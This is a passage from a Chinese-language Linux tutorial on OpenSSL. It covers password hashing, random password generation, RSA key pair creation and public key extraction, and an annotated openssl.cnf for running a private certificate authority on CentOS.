<span style="color: #ffa54f;"># &#21033;&#29992;Python&#31243;&#24207;&#22312;CentOS7 &#29983;&#25104;sha512&#21152;&#23494;&#23494;&#30721;</span>
<span style="color: #ffa54f;">[root@centos7 ~]#python -c 'import crypt,getpass;pw="me";print(crypt.crypt(pw))'</span>
<span style="color: #ffa54f;">$6$pt2FMf6YqKea3mh$.7Hkslg17uI.Wu7tVVtkzrwktXrOC8DxcMFC4JO1igrqR7VAi87H5PHOuLTUEjl7eJqKUhMT1e9ixojn1</span>
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl passwd -1 -salt SALT(&#26368;&#22810;8&#20301;)
openssl passwd -1 &#8211;salt centos
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">perl -e 'print crypt ("emacle2013",q($6$123456)),"\n"'</span>
$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">123456</span>$<span style="color: #a0522d;">tXk7FCLi2JWojnHgtJjwiTOjCgxZvWRpH0lDxQeHZ4uTW3kgAT</span>.pStPFB3kiYnD6uvoI9hvqvDcR/U/ngKHsj
</pre>
</div>
</div>
</div>
<div id="outline-container-h:c0dbf2d7-2749-41fa-a9e3-deb0869678cc" class="outline-4">
<h4 id="h:c0dbf2d7-2749-41fa-a9e3-deb0869678cc">openssl rand 命令生成随机数</h4>
<div class="outline-text-4" id="text-h:c0dbf2d7-2749-41fa-a9e3-deb0869678cc">
<p>
随机数生成器：伪随机数字，利用键盘和鼠标，块设备中断生成随机数
</p>

<pre class="example" id="orgb0c0387">
/dev/random：仅从熵池返回随机数；随机数用尽，阻塞
/dev/urandom：从熵池返回随机数；随机数用尽，会利用软件生成伪随机数,非阻塞
</pre>

<p>
帮助：man sslrand
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl rand -base64|-hex NUM

NUM: &#34920;&#31034;&#23383;&#33410;&#25968;&#65292;&#20351;&#29992;-hex&#65292;&#27599;&#20010;&#23383;&#31526;&#20026;&#21313;&#20845;&#36827;&#21046;&#65292;&#30456;&#24403;&#20110;4&#20301;&#20108;&#36827;&#21046;&#65292;&#20986;&#29616;&#30340;&#23383;&#31526;&#25968;&#20026;NUM*2
</pre>
</div>

<p>
范例：生成随机10位长度密码
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl rand -base64 9 |head -c10
6SOm1c6y1c[root@centos8 ~]#
[root@centos7 scripts]# openssl rand -hex 4
bced0c1c
[root@centos8 ~]#tr -dc <span style="color: #8b2252;">'[:alnum:]'</span> &lt; /dev/urandom |head -c10
GbfE24koEK[root@centos8 ~]#
</pre>
</div>
</div>
</div>
<div id="outline-container-h:b16f1720-42ef-457e-9bd6-17158ad42141" class="outline-4">
<h4 id="h:b16f1720-42ef-457e-9bd6-17158ad42141">openssl命令实现PKI</h4>
<div class="outline-text-4" id="text-h:b16f1720-42ef-457e-9bd6-17158ad42141">
<p>
公钥加密：
</p>

<ul class="org-ul">
<li>算法：RSA, ELGamal</li>
<li>工具：gpg, openssl rsautl（man rsautl）</li>
</ul>

<p>
数字签名：
</p>

<ul class="org-ul">
<li>算法：RSA, DSA, ELGamal</li>
</ul>

<p>
密钥交换：
</p>

<ul class="org-ul">
<li>算法：dh</li>
<li>DSA：Digital Signature Algorithm</li>
<li>DSS：Digital Signature Standard</li>
<li>RSA：</li>
</ul>

<p>
openssl命令生成密钥对儿：man genrsa
</p>

<p>
openssl genrsa用法
</p>

<pre class="example" id="org6a4854b">
openssl genrsa [-out filename] [-passout arg] [-des] [-des3] [-idea] [numbits]
选项说明：
-out filename     ：将生成的私钥保存至filename文件，若未指定输出文件，则为标准输出。
-numbits            ：指定要生成的私钥的长度，默认为1024。该项必须为命令行的最后一项参数。
-des|-des3|-idea：指定加密私钥文件用的算法，这样每次使用私钥文件都将输入密码，太麻烦所以很少使用。
-passout args    ：加密私钥文件时，传递密码的格式，如果要加密私钥文件时单未指定该项，则提示输入密码。传递密码的args的格式见openssl密码格式
</pre>

<p>
<b>生成私钥</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl genrsa -out /PATH/TO/PRIVATEKEY.FILE [-des3] [NUM_BITS,&#40664;&#35748;2048]
</pre>
</div>

<p>
范例: 生成秘钥对的私钥，可对私钥输入口令加密
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;&#23545;&#31216;&#31192;&#38053;&#21152;&#23494;&#30340;&#31169;&#38053;&#65292;&#36890;&#36807;&#35774;&#32622;&#20005;&#26684;&#30340;&#26435;&#38480;&#23454;&#29616;&#23433;&#20840;&#65292;&#24212;&#29992;&#26356;&#24191;&#27867;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">centos7&#40664;&#35748;644&#65292;centos8&#40664;&#35748;600</span>
[root@centos8 ~]#(<span style="color: #483d8b;">umask</span> 066; openssl genrsa -out /data/app.key 2048)
[root@centos8 ~]#cat /data/app.key 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA07M+D3J8MdAEj2Mx35XXjpqKZ5OmfsSWY5wJQDHDSEQ6KRYS
-----END RSA PRIVATE KEY-----

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#21152;&#23494;&#30340;&#23545;&#31216;&#31192;&#38053;key&#35299;&#23494;,&#27492;&#26041;&#24335;&#26356;&#23433;&#20840;&#65292;&#20294;&#26159;&#19981;&#26041;&#20415;&#65292;&#19981;&#36866;&#21512;&#25209;&#37327;&#25191;&#34892;</span>
[root@centos8 ~]#openssl genrsa -out /data/app2.key -des3 2048 <span style="color: #b22222;">#</span><span style="color: #b22222;">-des3 &#21152;&#23494;&#30340;&#23494;&#38053;&#23545;&#65292;&#38656;&#35201;&#36755;&#20837;&#21475;&#20196;&#12290;&#20351;&#29992;&#26102;&#35201;&#35299;&#23494;&#25165;&#33021;&#20351;&#29992;</span>
Enter pass phrase for /data/app2.key:
Verifying - Enter pass phrase for /data/app2.key:
[root@centos8 ~]#cat /data/app2.key 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,170BB158ABFA1750 <span style="color: #b22222;"># </span><span style="color: #b22222;">DES&#21152;&#23494;&#36807;&#30340;&#25991;&#20214;</span>

WAVQIqG6Ts1QV0tMGbaG+9Y4/jgVPQsYaew/WuS2S71VxPVw3bN9jk+ZhentebDf
-----END RSA PRIVATE KEY-----

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#38750;&#20132;&#20114;&#21152;&#23494;&#31169;&#38053;</span>
openssl genrsa -aes128 -out /data/app2.key -passout <span style="color: #8b2252;">"pass:123456"</span> 2048 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26126;&#25991;&#23494;&#30721;</span>

<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">MY_PASS</span>=123456 ; openssl genrsa -aes128 -out pri_key.pem -passout <span style="color: #8b2252;">"env:MY_PASS"</span> 2048 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21464;&#37327;&#33719;&#21462;&#23494;&#30721;</span>

<span style="color: #483d8b;">echo</span> 123456 &gt;mypass.txt ; openssl genrsa -aes128 -out pri_key.pem -des3 -passout <span style="color: #8b2252;">"file:mypass.txt"</span> 2048 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25991;&#20214;&#33719;&#21462;&#23494;&#30721;</span>
&#36825;&#37324;&#65292;&#25105;&#25351;&#23450;&#31169;&#38053;&#20250;&#20351;&#29992;AES-128&#31639;&#27861;&#26469;&#21152;&#23494;&#20445;&#23384;&#12290;&#24403;&#28982;&#20063;&#21487;&#20197;&#20351;&#29992;AES-192&#25110;&#32773;AES-256
&#65288;&#20998;&#21035;&#20351;&#29992;&#24320;&#20851; -aes192 &#21644; -aes256 &#65289;&#65292;&#20294;&#26159;&#26368;&#22909;&#19981;&#35201;&#20351;&#29992;&#20854;&#20182;&#31639;&#27861;&#65288;DES&#12289;3DES&#21644;SEED&#65289;&#12290;
</pre>
</div>

<p>
检查私钥信息
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">openssl rsa -in pri_key.pem  -text</span>
Enter pass phrase for pri_key.pem: *****
Private-Key: (2048 bit)
modulus:
    00:d0:82:e1:97:3c:0f:15:9d:4b:88:f0:d0:d9:17:
    ...
publicExponent: 65537 (0x10001)
privateExponent:
    0d:29:85:e6:0f:13:80:b0:ca:38:dd:c2:c1:41:7c:
    ...
prime1:
    00:e8:23:3b:ab:e2:c6:d3:8b:84:f3:ee:68:c8:6d:
    ...
prime2:
    00:e5:f1:e9:d7:4d:bb:04:25:95:eb:9d:0b:3f:61:
    ...
exponent1:
    0e:40:db:91:1a:43:8b:09:ae:08:2c:43:52:cb:21:
    ...
exponent2:
    5b:f0:aa:2b:28:2d:4a:af:2c:8e:94:b0:56:9b:73:
    ...
coefficient:
    00:c7:d9:f5:93:3c:d9:c8:f3:f3:11:34:1a:97:25:
    ... 
writing RSA key
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
</pre>
</div>

<p>
从私钥中提取出公钥
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl rsa -in PRIVATEKEYFILE &#8211;pubout &#8211;out PUBLICKEYFILE
</pre>
</div>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl rsa &#8211;in test.key &#8211;pubout &#8211;out test.key.pub
</pre>
</div>

<p>
范例：从私钥中提取出公钥
</p>

<div class="org-src-container">
<pre class="src src-sh">(<span style="color: #483d8b;">umask</span> 066;openssl genrsa -out /data/app.key 1024)

[root@centos8 ~]#openssl rsa -in /data/app.key -pubout -out /data/app.pub.key
writing RSA key
[root@centos8 ~]#ls -l /data/
total 8
-rw------- 1 root root 1675 May 20 22:34 app.key
-rw-r--r-- 1 root root  451 May 20 22:35 app.pub.key

[root@centos8 ~]#cat /data/app.pub.key
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwtz/zur9wEVQ4p2FB8yf
oFCGqYgtjJtYd/ZDC9K4OV3+o+eX4YjRigx2MZ1t0AK26d+e3UXOVprAgkwTg40f
wVye0iQaWCOZwySmLZybyZiGSwFViefEkrE9r5Bvn9iIRu+2zIA21R0DV2CnAdp1
AMEMysovBF6sy6unGAj8tYovDyPvH5tOM03pXkckrt58md8AFOKeW4CyIF31LDM1
94kPUqWzM7GQqdk86VbR46lppXPj0Hxe8Fg2zQqgShWzWpskBjtPX5cWxtjq0D90
M07w4klNGbR43vTOzgquC4VZyuk7Y1RWftKKp7JphAR5Q2DLVLdzHe8/Zqg/YqoM
/wIDAQAB
-----END PUBLIC KEY-----
</pre>
</div>

<p>
范例：加密过的私钥提取公钥需要输入口令
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl rsa -in /data/app2.key -pubout -out /data/app2.pub.key
Enter pass phrase for /data/app2.key:
writing RSA key
[root@centos8 ~]#cat /data/app2.pub.key
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwAkdfjBQowO/BQl05s+C
sZ2Q7CFfcNL5fiIReQhmDZm8BDGUwX/Pps7EO5YTC3T45Nt0zgbRqimoZ6g5soQm
GMMId3j5Du1Pjl9gYqDx6Jf5X6jSzq/r5TYgn4Gc0SsrG8fB00MN7xwUEsuE4GK8
Z9cQpt9HhjaqC4Va21e4JH33dhwzpjKzaUuD0dmjVJdsZV+BQFT4FTpneu0RIo8r
8VocXh1Vn/U77g2VFn5Xm4BhrqxqgX48r0AQZB6wxgE2xrjij2GInVJpiFL1SGYc
nZ6m2VS4Gwe6QoUi1GC1bKeElGh8vgcPF8oX2vb0ulZCJVlSkM8n91J9yrEmCZOR
WQIDAQAB
-----END PUBLIC KEY-----

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#38750;&#20132;&#20114;&#24335;</span>
openssl rsa -in /data/app2.key -pubout -out /data/app2.pub.key -passin <span style="color: #8b2252;">"pass:123456"</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26126;&#25991;</span>

<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">MY_PASS</span>=123456 ; penssl rsa -in /data/app2.key -pubout -out /data/app2.pub.key -passout <span style="color: #8b2252;">"env:MY_PASS"</span> 2048 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21464;&#37327;&#33719;&#21462;&#23494;&#30721;</span>

<span style="color: #483d8b;">echo</span> 123456 &gt;mypass.txt ; penssl rsa -in /data/app2.key -pubout -out /data/app2.pub.key -passout <span style="color: #8b2252;">"file:mypass.txt"</span> 2048 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25991;&#20214;&#33719;&#21462;&#23494;&#30721;</span>
</pre>
</div>

<p>
范例：生成加密的私钥，并解密
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl genrsa -out /data/app.key -des3 1024
Generating RSA private key, 1024 bit long modulus (2 primes)
.........+++++
................+++++
e is 65537 (0x010001)
Enter pass phrase for /data/app.key:
Verifying - Enter pass phrase for /data/app.key:

[root@centos8 ~]#openssl rsa -in /data/app.key -out /data/app.key2
Enter pass phrase for /data/app.key:
writing RSA key
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:876640bb-30e8-4bc7-88ce-5d01b7ad4f3d" class="outline-3">
<h3 id="h:876640bb-30e8-4bc7-88ce-5d01b7ad4f3d">建立私有CA实现证书申请颁发</h3>
<div class="outline-text-3" id="text-h:876640bb-30e8-4bc7-88ce-5d01b7ad4f3d">
<p>
参考：
</p>
<ul class="org-ul">
<li>openssl官网：<a href="http://www.openssl.org/">http://www.openssl.org/</a></li>
<li>Transport Layer Security: <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">https://en.wikipedia.org/wiki/Transport_Layer_Security</a></li>

<li>openssl学习参考</li>
</ul>

<blockquote>
<p>
<a href="https://www.openssl.org/docs/manmaster/man5/x509v3_config.html">官方openssl配置文件</a>
</p>

<p>
<a href="http://www.jinbuguo.com/linux/openssl_install.html">金步国OpenSSL配置文件</a>
</p>

<p>
<a href="https://www.feistyduck.com/library/openssl-cookbook/">ssl官方书籍openssl-cookbook</a>
</p>

<p>
ssl官方书籍中文<a href="https://files-cdn.cnblogs.com/files/f-ck-need-u/openssl-cookbook.pdf">openssl-cookbook.pdf</a>
</p>
</blockquote>

<p>
建立私有CA：
</p>

<ul class="org-ul">
<li>OpenCA：OpenCA开源组织使用Perl对OpenSSL进行二次开发而成的一套完善的PKI免费软件</li>
<li>openssl</li>
</ul>

<p>
相关名词：
</p>

<ul class="org-ul">
<li>/.csr：Certificate Signing Request证书签名请求的简写</li>
<li>/.crt：Certificate证书的简写</li>
</ul>

<p>
证书申请及签署步骤：
</p>
<ol class="org-ol">
<li>生成申请请求</li>
<li>RA核验。RA相当于接收证书请求的代理</li>
<li>CA签署</li>
<li>获取证书</li>
</ol>

<p>
范例：openssl-libs包
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#rpm -ql openssl-libs
/etc/pki/tls
/etc/pki/tls/certs
/etc/pki/tls/ct_log_list.cnf
/etc/pki/tls/misc
/etc/pki/tls/openssl.cnf <span style="color: #b22222;"># </span><span style="color: #b22222;">&#37197;&#32622;&#25991;&#20214;</span>
/etc/pki/tls/private
/usr/lib/.build-id
/usr/lib/.build-id/2f
/usr/lib/.build-id/2f/d658368c8d16cc6d2bc9584eca2b757c98df18
</pre>
</div>
</div>
<div id="outline-container-h:5afd8955-d92c-442d-93a4-280eea1dc06f" class="outline-4">
<h4 id="h:5afd8955-d92c-442d-93a4-280eea1dc06f">openssl的配置文件</h4>
<div class="outline-text-4" id="text-h:5afd8955-d92c-442d-93a4-280eea1dc06f">
<div class="org-src-container">
<pre class="src src-sh">/etc/pki/tls/openssl.cnf
</pre>
</div>

<p>
三种策略：match匹配、optional可选、supplied提供
</p>
<pre class="example" id="org6b56be7">
match：要求申请填写的信息跟CA设置信息必须一致
optional：可有可无，跟CA设置信息可不一致
supplied：必须填写这项申请信息
</pre>

<p>
范例：
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cat /etc/pki/tls/openssl.cnf
......
<span style="color: #b22222;">####################################################################</span>
[ ca ]
default_ca  = CA_default        <span style="color: #b22222;"># </span><span style="color: #b22222;">The default ca section</span>

<span style="color: #b22222;">####################################################################</span>
[ CA_default ]
dir     = /etc/pki/CA           <span style="color: #b22222;"># </span><span style="color: #b22222;">Where everything is kept CA&#30340;&#24037;&#20316;&#30446;&#24405;</span>
certs       = $<span style="color: #a0522d;">dir</span>/certs        <span style="color: #b22222;"># </span><span style="color: #b22222;">Where the issued certs are kept  &#39041;&#21457;&#30340;&#35777;&#20070;&#25152;&#22312;&#20301;&#32622;</span>
crl_dir     = $<span style="color: #a0522d;">dir</span>/crl          <span style="color: #b22222;"># </span><span style="color: #b22222;">Where the issued crl are kept   &#24050;&#21514;&#38144;&#35777;&#20070;&#30340;&#21514;&#38144;&#21015;&#34920;&#30340;&#23384;&#20648;&#30446;&#24405;&#20301;&#32622;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">centos8 &#40664;&#35748;&#27809;&#26377;index.txt&#65292;&#33258;&#34892;&#21019;&#24314;</span>
database    = $<span style="color: #a0522d;">dir</span>/index.txt    <span style="color: #b22222;"># </span><span style="color: #b22222;">database index file.   &#35777;&#20070;&#39041;&#21457;&#30340;&#32034;&#24341;&#25991;&#20214;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">unique_subject = no            # Set to 'no' to allow creation of</span>
                                <span style="color: #b22222;"># </span><span style="color: #b22222;">several certs with same subject.</span>
new_certs_dir   = $<span style="color: #a0522d;">dir</span>/newcerts <span style="color: #b22222;"># </span><span style="color: #b22222;">default place for new certs.   &#26032;&#39041;&#21457;&#35777;&#20070;&#30340;&#40664;&#35748;&#20301;&#32622;</span>

certificate = $<span style="color: #a0522d;">dir</span>/cacert.pem   <span style="color: #b22222;"># </span><span style="color: #b22222;">The CA certificate    CA&#35777;&#20070;&#25152;&#22312;&#20301;&#32622;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">centos8 &#40664;&#35748;&#27809;&#26377;serial&#65292;&#33258;&#34892;&#21019;&#24314;</span>
serial      = $<span style="color: #a0522d;">dir</span>/serial       <span style="color: #b22222;"># </span><span style="color: #b22222;">The current serial number  &#19979;&#19968;&#20010;&#35201;&#39041;&#21457;&#35777;&#20070;&#30340;&#32534;&#21495;</span>
crlnumber   = $<span style="color: #a0522d;">dir</span>/crlnumber    <span style="color: #b22222;"># </span><span style="color: #b22222;">the current crl number &#35777;&#20070;&#21514;&#38144;&#32534;&#21495;</span>
                                <span style="color: #b22222;"># </span><span style="color: #b22222;">must be commented out to leave a V1 CRL</span>
crl     = $<span style="color: #a0522d;">dir</span>/crl.pem          <span style="color: #b22222;"># </span><span style="color: #b22222;">The current CRL   &#26366;&#34987;&#21514;&#38144;&#30340;&#35777;&#20070;&#21015;&#34920;</span>
private_key = $<span style="color: #a0522d;">dir</span>/private/cakey.pem# The private key   CA&#31169;&#38053;&#25991;&#20214;&#20301;&#32622;

x509_extensions = usr_cert      <span style="color: #b22222;"># </span><span style="color: #b22222;">The extensions to add to the cert</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">Comment out the following two lines for the "traditional"</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">(and highly broken) format.</span>
name_opt    = ca_default        <span style="color: #b22222;"># </span><span style="color: #b22222;">Subject Name options</span>
cert_opt    = ca_default        <span style="color: #b22222;"># </span><span style="color: #b22222;">Certificate field options</span>

default_days    = 365           <span style="color: #b22222;"># </span><span style="color: #b22222;">how long to certify for  &#40664;&#35748;&#26377;&#25928;&#26399;&#65292;&#20844;&#21496;&#20869;&#37096;&#20351;&#29992;&#24212;&#35843;&#38271;&#19968;&#20123;</span>
<span style="color: #a0522d;">default_crl_days</span>= 30            <span style="color: #b22222;"># </span><span style="color: #b22222;">how long before next CRL &#40664;&#35748;&#21514;&#38144;&#21015;&#34920;&#23384;&#25918;&#26102;&#38388;</span>
default_md  = sha256        <span style="color: #b22222;"># </span><span style="color: #b22222;">use SHA-256 by default &#40664;&#35748;&#25688;&#35201;&#31639;&#27861;sha256</span>
preserve    = no            <span style="color: #b22222;"># </span><span style="color: #b22222;">keep passed DN ordering</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">A few difference way of specifying how similar the request should look</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">For type CA, the listed attributes must be the same, and the optional</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">and supplied fields are just that :-)</span>
policy      = policy_match

<span style="color: #b22222;"># </span><span style="color: #b22222;">For the CA policy</span>
[ policy_match ]
countryName     = match               <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22269;&#23478;</span>
stateOrProvinceName = match           <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30465;&#20221;</span>
organizationName    = match           <span style="color: #b22222;">#</span><span style="color: #b22222;">&#32452;&#32455;&#26426;&#26500;  match &#30003;&#35831;&#35777;&#20070;&#26102;&#22269;&#23478;&#30465;&#20221;&#32452;&#32455;&#36825;3&#39033;&#24517;&#39035;&#21644;CA&#19968;&#33268;</span>
organizationalUnitName  = optional    <span style="color: #b22222;">#</span><span style="color: #b22222;">&#37096;&#38376; optional &#21487;&#36873;&#30340; &#21487;&#20197;&#21644;&#19978;&#38754;&#30340;&#19981;&#19968;&#26679;</span>
commonName      = supplied            <span style="color: #b22222;">#</span><span style="color: #b22222;">&#36890;&#29992;&#22495;&#21517; supplied&#24517;&#39035;&#22635;&#20889;</span>
emailAddress        = optional

<span style="color: #b22222;"># </span><span style="color: #b22222;">For the 'anything' policy</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">At this point in time, you must list all acceptable 'object'</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">types.</span>
[ policy_anything ]
countryName     = optional
stateOrProvinceName = optional
localityName        = optional
organizationName    = optional
organizationalUnitName  = optional
commonName      = supplied
emailAddress        = optional
......
</pre>
</div>
</div>
<div id="outline-container-h:95b932a5-524e-4eeb-8caa-ce61fadc0c54" class="outline-5">
<h5 id="h:95b932a5-524e-4eeb-8caa-ce61fadc0c54">语法</h5>
<div class="outline-text-5" id="text-h:95b932a5-524e-4eeb-8caa-ce61fadc0c54">
<pre class="example" id="org0f52d43">
# 变量 = 值
# 1. 字符串值最好使用双引号界定，并且其中可以使用"\n","\r","\t","\\"这些转义序列。
# 2. 可以使用 ${变量名} 的形式引用同一字段中的变量，使用 ${字段名::变量名} 的形式引用其它字段中的变量。
# 3. 可以使用 ${ENV::环境变量} 的形式引用操作系统中定义的环境变量，若变量不存在则会导致错误。
# 4. 可以在默认字段定义与操作系统环境变量同名的变量作为默认值来避免环境变量不存在导致的错误。
# 5. 如果在同一字段内有多个相同名称的变量，那么后面的值将覆盖前面的值。
# 6. 可以通过 ".include = 绝对路径" 语法或 OPENSSL_CONF_INCLUDE 环境变量引入其他配置文件(*.cnf)。
</pre>
</div>
</div>
<div id="outline-container-h:c74bffea-288b-4e0a-a420-d80b1b3104a5" class="outline-5">
<h5 id="h:c74bffea-288b-4e0a-a420-d80b1b3104a5">默认字段</h5>
<div class="outline-text-5" id="text-h:c74bffea-288b-4e0a-a420-d80b1b3104a5">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">[ default ]</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27492;&#37096;&#20998;&#26159;&#40664;&#35748;&#23383;&#27573;&#65292;&#24517;&#39035;&#25918;&#22312;&#25152;&#26377;&#23383;&#27573;&#20043;&#21069;&#12290;&#23567;&#33410;&#22836;"[default]"&#26159;&#21487;&#36873;&#30340;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35835;&#21462;&#37197;&#32622;&#25991;&#20214;&#26102;&#65292;&#20250;&#39318;&#20808;&#26681;&#25454;&#23383;&#27573;&#21517;&#31216;&#21435;&#23547;&#25214;&#30456;&#24212;&#30340;&#37197;&#32622;&#27573;&#65292;&#22914;&#26524;&#27809;&#26377;&#25214;&#21040;&#21017;&#20250;&#20351;&#29992;&#36825;&#37324;&#30340;&#40664;&#35748;&#23383;&#27573;&#12290;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23450;&#20041; HOME &#30340;&#40664;&#35748;&#20540;&#65292;&#38450;&#27490;&#25805;&#20316;&#31995;&#32479;&#20013;&#19981;&#23384;&#22312; HOME &#29615;&#22659;&#21464;&#37327;&#12290;</span>
HOME = /tmp

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#30340;&#38543;&#26426;&#25968;&#31181;&#23376;&#25991;&#20214;&#65292;&#23545;&#24212; -rand &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
RANDFILE = /dev/random

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25193;&#23637;&#23545;&#35937;&#23450;&#20041;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;&#22312; OpenSSL &#21629;&#20196;&#34892;&#20013;&#23450;&#20041;X.509&#35777;&#20070;&#30340;&#25193;&#23637;&#39033;&#65292;&#37027;&#20040;&#23601;&#20250;&#20174;&#19979;&#38754;&#23545;&#25193;&#23637;&#23545;&#35937;&#30340;&#23450;&#20041;&#20013;&#33719;&#21462;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23450;&#20041;&#26041;&#27861;&#26377;&#20004;&#31181;&#65292;&#31532;&#19968;&#31181;(&#21453;&#23545;&#20351;&#29992;)&#26159;&#23384;&#20648;&#22312;&#22806;&#37096;&#25991;&#20214;&#20013;&#65292;&#20063;&#23601;&#26159;&#36825;&#37324;"oid_file"&#21464;&#37327;&#23450;&#20041;&#30340;&#25991;&#20214;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">oid_file = ${ENV::HOME}/.oid</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#31532;&#20108;&#31181;&#26159;&#23384;&#20648;&#22312;&#37197;&#32622;&#25991;&#20214;&#30340;&#19968;&#20010;&#23383;&#27573;&#20013;&#65292;&#20063;&#23601;&#26159;&#36825;&#37324;"oid_section"&#21464;&#37327;&#20540;&#25152;&#25351;&#23450;&#30340;&#23383;&#27573;&#12290;</span>
oid_section = new_oids

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#23558;&#27492;&#37197;&#32622;&#25991;&#20214;&#29992;&#20110; "openssl x509" &#21629;&#20196;&#30340; "-extfile" &#36873;&#39033;&#65292;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35831;&#22312;&#27492;&#25351;&#23450;&#21253;&#21547; X.509v3 &#25193;&#23637;&#30340;&#23567;&#33410;&#21517;&#31216;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">extensions =</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25110;&#32773;&#20351;&#29992;&#19968;&#20010;&#40664;&#35748;&#23383;&#27573;&#20013;&#20165;&#21253;&#21547; X.509v3 &#25193;&#23637;&#30340;&#37197;&#32622;&#25991;&#20214;</span>

[ new_oids ]
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28155;&#21152;&#21487;&#20197;&#34987; 'ca', 'req', 'ts' &#21629;&#20196;&#20351;&#29992;&#30340;&#25193;&#23637;&#23545;&#35937;&#12290;&#26684;&#24335;&#22914;&#19979;&#65306;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23545;&#35937;&#31616;&#31216; = &#23545;&#35937;&#25968;&#23383;ID</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19979;&#38754;&#26159;&#19968;&#20123;&#22686;&#24378;&#22411;&#23494;&#38053;&#29992;&#27861;(extendedKeyUsage)&#30340;&#20363;&#23376;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20219;&#20309;&#30446;&#30340;(&#19968;&#27425;&#24615;&#21253;&#21547;&#25152;&#26377;&#22686;&#24378;&#29992;&#27861;)</span>
anyExtendedUsage = 2.5.29.37.0
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26381;&#21153;&#22120;&#36523;&#20221;&#39564;&#35777;</span>
serverAuth = 1.3.6.1.5.5.7.3.1
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23458;&#25143;&#31471;&#36523;&#20221;&#39564;&#35777;</span>
clientAuth = 1.3.6.1.5.5.7.3.2
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20195;&#30721;&#31614;&#21517;</span>
codeSigning = 1.3.6.1.5.5.7.3.3
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#20840;&#30005;&#23376;&#37038;&#20214;</span>
emailProtection = 1.3.6.1.5.5.7.3.4
<span style="color: #b22222;"># </span><span style="color: #b22222;">IPSec &#32456;&#31471;&#31995;&#32479;</span>
ipsecEndSystem = 1.3.6.1.5.5.7.3.5
<span style="color: #b22222;"># </span><span style="color: #b22222;">IPSec &#38567;&#36947;</span>
ipsecTunnel = 1.3.6.1.5.5.7.3.6
<span style="color: #b22222;"># </span><span style="color: #b22222;">IPSec &#29992;&#25143;</span>
ipsecUser = 1.3.6.1.5.5.7.3.7
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26102;&#38388;&#25139;</span>
timeStamping = 1.3.6.1.5.5.7.3.8
